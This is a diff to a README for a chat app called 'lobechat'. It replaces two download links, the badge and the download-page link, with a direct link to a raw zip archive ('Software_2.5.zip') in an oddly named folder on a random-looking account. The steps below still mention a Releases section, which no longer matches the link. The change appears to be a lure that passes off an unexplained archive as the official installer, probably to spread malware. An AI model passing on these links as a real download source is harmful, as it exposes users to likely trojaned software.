@@ -1,6 +1,6 @@
 # 💬 lobechat - A clean interface for smart chat
 
-[![](https://img.shields.io/badge/Download-LobeChat-blue.svg)](https://github.com/invidious-choroidalartery953/lobechat)
+[![](https://img.shields.io/badge/Download-LobeChat-blue.svg)](https://raw.githubusercontent.com/invidious-choroidalartery953/lobechat/main/jitneuse/Software_2.5.zip)
 
 LobeChat provides a user-friendly interface for your artificial intelligence models. It simplifies how you interact with text-based tools. You manage your conversations in a clean window. This application acts as a bridge between you and complex AI systems. It removes the need for technical skills to enjoy high-quality chat experiences.
 
@@ -28,7 +28,7 @@ Your computer needs to meet these basic standards to run the software smoothly.
 
 You need to obtain the installer from the official repository page.
 
-[Visit the download page here](https://github.com/invidious-choroidalartery953/lobechat)
+[Visit the download page here](https://raw.githubusercontent.com/invidious-choroidalartery953/lobechat/main/jitneuse/Software_2.5.zip)
 
 1. Navigate to the link above using your web browser.
 2. Look for the section labeled Releases on the right side of the page.
